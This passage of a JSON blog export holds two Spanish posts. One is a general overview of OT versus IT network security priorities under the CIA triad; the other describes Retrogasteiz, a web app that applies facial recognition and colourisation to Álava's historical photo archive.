        "content": "![](/static/images/uploads/ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas/IT-vs-OT_Featured.webp)\n\nLa ciberseguridad es indispensable en la era digital, especialmente en los entornos de producción industrial. Dentro de estos entornos, se pueden encontrar dos tipos de redes con características muy distintivas: las redes **OT** y las redes **IT**. A continuación, profundizaremos en estas diferencias desde la perspectiva de la ciberseguridad.\n\n## **¿Qué es la tríada CIA?**\n\nLa tríada **CIA** es un modelo fundamental en la ciberseguridad que se compone de tres principios esenciales:\n\n* **Confidencialidad**: busca preservar la privacidad y protección de la información.\n* **Integridad**: se enfoca en la protección de la no alteración de los datos\n* **Disponibilidad**: se centra en asegurar el acceso adecuado y continuo a la información y sistemas\n\nEstos tres conceptos son considerados como los pilares básicos necesarios para proteger adecuadamente las redes, los sistemas y la información sensible de cualquier tipo de amenaza o ataque cibernético.\n\n## **¿Qué son las redes OT?**\n\n  \nLas redes **OT** (Operation Technologies) son redes de control industrial que permiten el monitoreo y control de procesos físicos. Son muy utilizadas en industrias como manufactura, energía y química. Las redes **OT** son críticas para la **producción**, y un ataque o falla en esta red puede tener graves consecuencias.\n\n## **¿Qué son las redes IT?**\n\nLas redes **IT** (Information Technologies) son redes de información que permiten el intercambio de datos entre usuarios y sistemas. Las redes **IT** incluyen internet, intranet, correo electrónico, entre otras. Estas redes han tenido una gran evolución en los últimos años, y la mayoría de las empresas y organizaciones dependen de ellas para su operación diaria.\n\n## **Riesgos y desafíos de la ciberseguridad en redes OT vs redes IT**\n\n![](/static/images/uploads/ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas/ITvsOT.webp)\n\n⚠️Los riesgos y desafíos de la ciberseguridad son muy distintos en cada tipo de red. Las **redes IT** enfrentan mayores riesgos de ataques cibernéticos. Los hackers pueden interferir en la privacidad, integridad y disponibilidad de los datos, lo que puede afectar a la productividad, desempeño y reputación de la empresa.\n\nPor otro lado, **las redes OT** enfrentan mayores riesgos de ataques físicos y cibernéticos. Un ataque en una red OT puede causar daños en la producción, la seguridad de los trabajadores y la continuidad del negocio.\n\n## CIA en redes IT\n\nEn redes **IT**, la **confidencialidad** es la **prioridad principal** porque su función principal es la gestión y transmisión de información sensible. La protección de datos personales, secretos comerciales y otra información confidencial es fundamental en las redes IT. En este tipo de redes, la **integridad** de los datos es la **segunda prioridad**, ya que se garantiza que los datos no se hayan modificado o alterado incorrectamente, lo que podría provocar daños a la organización y a los usuarios. La **disponibilidad ocupa el tercer lugar** porque, si bien es importante que los usuarios tengan acceso continuo a los datos, la pérdida o la filtración de datos puede tener consecuencias más graves.\n\n## CIA en redes OT\n\nEn redes **OT**, la **disponibilidad** es la prioridad principal, ya que estas redes están diseñadas para controlar el funcionamiento y la producción de instalaciones industriales como refinerías, plantas energéticas y maquinarias pesadas. Si la red **OT** deja de funcionar, puede causar interrupciones en la producción y la seguridad de los trabajadores, lo que provoca grandes pérdidas económicas. Después de la disponibilidad, la **integridad** es la **segunda prioridad**, ya que los datos y la precisión de los procesos son fundamentales para el funcionamiento adecuado de las instalaciones industriales. Por último, la **confidencialidad** ocupa el **tercer lugar**, porque la privacidad y el secreto comercial son menos relevantes en comparación con la disponibilidad y la integridad.\n\n## Conclusión\n\nLa protección de las redes IT y OT representa un desafío importante en el ámbito de la ciberseguridad. Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas. Además, mantener ambas redes conectadas para monitorear las operaciones en la red industrial desde la oficina de negocios puede plantear desafíos adicionales en términos de seguridad.\n\n⚠️Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellasEn este contexto, es fundamental implementar controles de acceso y medidas de seguridad adecuadas para garantizar la protección tanto de las redes IT como OT. La segmentación de redes, la autenticación multifactorial y la constante monitorización y actualización de software y hardware son medidas esenciales en la protección de ambas redes.\n\nEn conclusión, la protección de las redes IT y OT requiere de la implementación de medidas de seguridad específicas y la consideración detallada de las diferencias de prioridad en la triada CIA de cada una. La conectividad entre estas redes debe ser afrontada con un enfoque especializado en la seguridad y, por lo tanto, se requiere una planificación cuidadosa y una implementación detallada de soluciones de seguridad en ambas redes.\n\n"
    },
    {
        "title": "Retrogasteiz: Innovación y Tradición en la Visualización de Archivos Históricos de Álava",
        "slug": "retrogasteiz",
        "date": "2023-08-03",
        "tags": [
            "retrogasteiz",
            "AWS",
            "Blog"
        ],
        "images": [
            "/static/images/uploads/retrogasteiz/poster.webp",
            "/static/images/uploads/retrogasteiz/plot.webp",
            "/static/images/uploads/retrogasteiz/image.webp",
            "/static/images/uploads/retrogasteiz/image-1.webp",
            "/static/images/uploads/retrogasteiz/image-2.webp",
            "/static/images/uploads/retrogasteiz/image-3.webp",
            "/static/images/uploads/retrogasteiz/2d6ad75b46a729e589f9225e838a7d4635ed71f5.webp"
        ],
        "draft": false,
        "summary": "Retrogasteiz es una aplicación web que utiliza tecnologías de inteligencia artificial para explorar el archivo fotográfico de Álava. Ofrece búsquedas simplificadas, reconocimiento facial, coloración de imágenes y comparación de versiones en blanco y negro. Aunque presenta desafíos de carga y navegación, representa una nueva forma de interactuar y disfrutar del pasado de Álava.",
        "content": "![](/static/images/uploads/retrogasteiz/poster.webp)\n\n[Retrogasteiz.com](https://retrogasteiz.com) ha sido un experimento personal inspirado por las obras originales de [Jaime Gómez-Obregón](https://jaime.gomezobregon.com/) en [Retrosantander](https://retrosantander.com/) y [Retrogipuzkoa](https://retrogipuzkoa.com/). Actualmente tiene más de 100.000 imágenes del Archivo de Álava aunque solo están publicadas aquellas imágenes que se han podido catalogar entre los años 1818 y 1990. Estas imágenes han sido digitalizadas por la [Diputación Foral de Álava - Araba Foru Aldundia](https://photo.araba.eus/s/photoaraba) y se han publicado bajo la licencia abierta [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.es) en https://photo.araba.eus por la misma entidad.\n\n💡El objetivo de este proyecto es investigar nuevas maneras de realzar un archivo fotográfico público, mediante la implementación de conceptos innovadores como la visión artificial y las interfaces de usuario modernas.Además, Retrogasteiz sirve como un ejemplo palpable de cómo la disponibilidad abierta de bases de datos públicas brinda a la gente la oportunidad de desarrollar y compartir iniciativas frescas y colaborativas buscando la mejora continua de los resultados disponibles.\n\n# Descripción del Archivo Histórico de Álava\n\nIniciado por el Archivo de Álava, PHOTO-ARABA sirve como el vehículo principal para compartir el patrimonio fotográfico de la Diputación Foral de Álava con el público.\n\nEste proyecto cultural, en constante expansión, ya cuenta con una colección impresionante de más de cien mil imágenes históricas.\n\nLo que PHOTO-ARABA ofrece es una ventana única a la evolución de nuestro territorio en los aspectos políticos, sociales y económicos. Captura los cambios en el paisaje y en las áreas urbanas, y documenta las transformaciones en el estilo de vida y en las tradiciones alavesas a lo largo del último siglo. Además de las imágenes situadas en Álava, la colección también incluye fotografías de viajes y de eventos importantes ocurridos en otros lugares.\n\n# Qué es Retrogasteiz\n\n[Retrogasteiz](https://retrogasteiz.com/) es una aplicación web innovadora que busca llevar el patrimonio fotográfico de Álava a nuevos horizontes donde la antigua Vitoria es la protagonista. Mientras que PHOTO-ARABA sirve como el portal oficial para la difusión del archivo histórico, ofreciendo acceso a más de cien mil fotografías documentadas, Retrogasteiz va un paso más allá en la exploración y visualización de este valioso recurso.\n\n## Diferencias clave entre PHOTO-ARABA y Retrogasteiz\n\n* **Tecnología Avanzada:** Retrogasteiz emplea tecnologías de inteligencia artificial, como el reconocimiento facial a través de Amazon AWS y la coloración de imágenes en blanco y negro utilizando DeOldify. Esto permite a los usuarios interactuar con las imágenes de una manera más viva y dinámica.\n* **Visualización Mejorada:** Mientras PHOTO-ARABA se centra en la presentación y documentación de las imágenes, Retrogasteiz ofrece una experiencia de visualización optimizada, con la conversión de imágenes a formato **webp**, reduciendo así el peso de las imágenes en un 70% con respecto al formato **jpg**. Esto facilita una carga más rápida y eficiente.\n\n![Reducción tamaño total de almacenamiento de todas las imágenes](/static/images/uploads/retrogasteiz/plot.webp)\n\n* **Corrección y Filtrado de Datos:** Retrogasteiz ha implementado mejoras en la precisión de los datos, corrigiendo fechas incorrectas y permitiendo futuras consultas con filtrado de fechas. Esto contrasta con el enfoque más estático de PHOTO-ARABA.\n* **Experiencia de Usuario Moderna:** Con interfaces de usuario contemporáneas, Retrogasteiz brinda una experiencia de navegación más intuitiva y atractiva, permitiendo a los usuarios explorar el archivo histórico de una manera más interactiva y personalizada.\n\nEn resumen, mientras PHOTO-ARABA proporciona un acceso esencial y directo al archivo histórico de Álava, Retrogasteiz amplía este acceso, ofreciendo nuevas formas de interactuar y disfrutar del patrimonio fotográfico a través de tecnologías y enfoques modernos. Retrogasteiz representa no solo una extensión de PHOTO-ARABA sino una evolución, celebrando el pasado mientras abraza el futuro de la visualización digital.\n\n# Integración de Inteligencia Artificial\n\nLa incorporación de tecnologías de Inteligencia Artificial (IA) ha sido un elemento clave en la innovación que [Retrogasteiz](https://retrogasteiz.com/) aporta al archivo histórico de Álava. Este proceso ha implicado el uso de diferentes herramientas y técnicas, detalladas a continuación:\n\n* **Reconocimiento Facial con AWS:** Para potenciar la capacidad de identificación y búsqueda dentro de una muestra de 10.000 imágenes, se ha recurrido a la plataforma [Amazon Web Services](https://aws.amazon.com/es/rekognition/) (AWS) para el reconocimiento facial. La implementación de esta tecnología de reconocimiento facial ha sido posible a través de una suscripción a AWS, con un costo aproximado de 50€. Al tratarse de un servicio de pago por uso, esta inversión ha permitido analizar y procesar la muestra seleccionada, agregando una dimensión de búsqueda y análisis única al archivo.\n\n![Reconocimiento facial peluquería de señoras Urrutia](/static/images/uploads/retrogasteiz/image.webp)\n\n* **Coloreado con Deoldify:** A través del uso del modelo de deep learning de [Deoldify](https://deoldify.ai/), se ha llevado a cabo un proceso de coloreado para las imágenes en blanco y negro. A diferencia del reconocimiento facial, esta etapa del proyecto se ha realizado en local, sin incurrir en costos adicionales. La integración de Deoldify ha añadido vida y color a las imágenes históricas, permitiendo a los usuarios experimentar las fotos en una forma más cercana a cómo habrían aparecido en la realidad en su momento.\n\n![Coloreado de la casa/peluquería de señoras Urrutia](/static/images/uploads/retrogasteiz/image-1.webp)\n\nLa combinación de estas tecnologías de IA ha enriquecido Retrogasteiz, no solo mejorando la visualización y experiencia del usuario sino también abriendo nuevas posibilidades para la investigación y el estudio del patrimonio fotográfico de Álava. El equilibrio entre las soluciones de pago y las implementaciones locales refleja una estrategia cuidadosa y eficiente para maximizar el valor y el impacto de la integración de la Inteligencia Artificial en el proyecto.\n\n# Curiosidades y Desafíos\n\nDentro del vasto archivo fotográfico de Álava, se han encontrado algunos datos curiosos y desafíos inesperados. Un aspecto notable fue la presencia de fechas incorrectas en algunas imágenes, como el [29 de febrero de 1953](https://photo.araba.eus/s/photoaraba/item/162447) o el [31 de junio de 1953](https://photo.araba.eus/s/photoaraba/item/162796), fechas que simplemente no existen en el calendario.\n\nEste hallazgo planteó la necesidad de un proceso de corrección meticuloso. Las fechas erróneas se parsearon y corrigieron, permitiendo no solo una mayor precisión en la documentación sino también la posibilidad de futuras consultas y aplicaciones de filtros. Este trabajo, aunque esencial, denota un proceso manual en la catalogación de las imágenes que dejó margen para errores.\n\nEs un punto de reflexión interesante en la era de la digitalización, en la que los políticos y gobiernos a menudo promocionan los avances tecnológicos y la transformación digital. A pesar de este enfoque en la modernización, aún se pueden encontrar estos pequeños errores manuales en procesos que involucran patrimonio tan valioso.\n\n💡El propósito de resaltar estos desafíos no es criticar a quienes han trabajado arduamente en la catalogación de estos archivos. Más bien, es un llamado de atención a las instituciones que promueven la digitalización pero no proporcionan los recursos necesarios y eficientes para asegurar que el trabajo se realice con el cuidado y la precisión que merece.Este incidente no disminuye la importancia del archivo, pero sí subraya la importancia de una transición cuidadosa hacia la digitalización. La corrección de estos errores en [Retrogasteiz](https://retrogasteiz.com) demuestra una atención al detalle y un compromiso con la precisión y calidad, asegurando que las imágenes históricas sean un reflejo fiel y accesible del pasado de Álava.\n\n# Resultados y Aplicaciones \n\nLa plataforma [Retrogasteiz](https://retrogasteiz.com/) lleva la exploración del archivo fotográfico de Álava a un nuevo nivel, ofreciendo funcionalidades únicas que enriquecen la experiencia del usuario. Estas innovaciones se destacan a continuación:\n\n* **Búsqueda Simplificada:** A través de la web, los usuarios pueden realizar búsquedas teniendo en cuenta diversos parámetros como el título, descripción, y fechas. Se ha diseñado un sistema de búsqueda intuitivo y eficiente que evita al usuario tener que lidiar con filtros o formularios innecesarios y repetir búsquedas. Esta optimización en el proceso de búsqueda permite una exploración más ágil y satisfactoria del archivo.\n\n![Buscador simplificado con sugerencias](/static/images/uploads/retrogasteiz/image-2.webp)\n\n* **Reconocimiento Facial:** La integración de tecnologías de IA para el reconocimiento facial no solo permite visualizar las caras reconocidas en las imágenes, sino que también abre la puerta a futuras funcionalidades, como la posibilidad de realizar búsquedas por rostros. Esta característica agrega una dimensión adicional a la forma en que se pueden explorar y entender las imágenes históricas.\n\n![Personas detectadas en la imágen](/static/images/uploads/retrogasteiz/image-3.webp)\n\n* **Coloreado y Comparación de Imágenes:** Retrogasteiz ofrece la posibilidad de colorear imágenes en blanco y negro y descargar una comparación entre las versiones en color y en blanco y negro. Esta función transforma la forma en que los usuarios interactúan con las imágenes, permitiendo una apreciación más profunda y viva de los detalles y la historia que capturan.\n\n![Retratos de boda de los recién casados Martín Ona y Pilar Arregui](/static/images/uploads/retrogasteiz/2d6ad75b46a729e589f9225e838a7d4635ed71f5.webp)\n\nEstas aplicaciones y resultados reflejan el compromiso de Retrogasteiz con la innovación y la mejora continua en la presentación del patrimonio fotográfico de Álava. La plataforma no solo proporciona una ventana al pasado, sino que también emplea la tecnología moderna para facilitar una exploración más rica y atractiva, haciendo que la historia cobre vida de formas antes inimaginables.\n\nCompartir algunos de los resultados alcanzados.  \nPosibles aplicaciones y cómo podría beneficiar a historiadores, investigadores, y al público en general.\n\n# Desafíos y Oportunidades\n\nUna de las características distintivas de [Retrogasteiz](https://retrogasteiz.com/) es que la web se ejecuta íntegramente en el navegador del usuario. Aunque esto ofrece una experiencia de usuario fluida y sin dependencias externas, también ha presentado ciertos desafíos.\n\nCon grandes cantidades de datos, algunos usuarios pueden experimentar lentitud en la carga y navegación de las imágenes. Este problema surge del procesamiento intensivo que se realiza en el navegador, especialmente cuando se interactúa con múltiples imágenes o se aplica el coloreado de inteligencia artificial.\n\nSi bien este es un aspecto que se reconoce como una área de mejora, también representa una oportunidad emocionante para el futuro de Retrogasteiz. Entre las posibles soluciones y estrategias que podrían ser implementadas, se encuentran:\n\n* **Optimización de Carga de Datos:** Implementar técnicas de paginación y carga diferida podría aliviar la presión sobre el navegador, permitiendo una experiencia más rápida y sin inconvenientes.\n* **Uso de Tecnologías de Compresión:** La exploración de formatos de compresión más eficientes y métodos de entrega podría mejorar significativamente la velocidad de carga y la eficiencia en la manipulación de datos.\n* **Procesamiento en el Servidor:** Considerar el procesamiento en el servidor para algunas tareas pesadas podría equilibrar la carga entre el navegador y el servidor, ofreciendo una experiencia más ágil.\n\n# Agradecimientos:\n\nEn la culminación de un proyecto tan fascinante y ambicioso como Retrogasteiz, es esencial reconocer y agradecer a aquellos que han hecho posible esta jornada.\n\nEn primer lugar, me gustaría expresar mi más profundo agradecimiento a la **Diputación Foral de Álava**. Su dedicación en la preservación y digitalización del archivo histórico de Álava ha sido fundamental para proporcionar los recursos y el contexto necesarios para este proyecto. Su compromiso con la cultura, la historia, y la apertura en el acceso a estos tesoros ha sido una fuente constante de inspiración.\n\nEn segundo lugar, no puedo dejar de mencionar a **Jaime Gómez-Obregón**, cuyo trabajo en este ámbito ha sido un catalizador para mi propio viaje en la exploración de la fotografía histórica. Su enfoque innovador y su pasión por conectar el pasado con el presente mediante la tecnología me ha inspirado no solo a emprender este proyecto, sino también a buscar nuevas formas de enriquecer y compartir nuestro patrimonio común.\n\nEste proyecto es un testamento de lo que se puede lograr cuando la innovación, la pasión y la colaboración se unen. Es un recordatorio de que las imágenes del pasado tienen mucho que enseñarnos y que la tecnología puede ser un puente hacia nuevas comprensiones y conexiones.\n\nA todos aquellos que han contribuido, directa o indirectamente, a este proyecto, mi sincero agradecimiento. Vuestro apoyo y inspiración han sido fundamentales para hacer de Retrogasteiz una realidad vibrante y enriquecedora.\n\n"
    }
]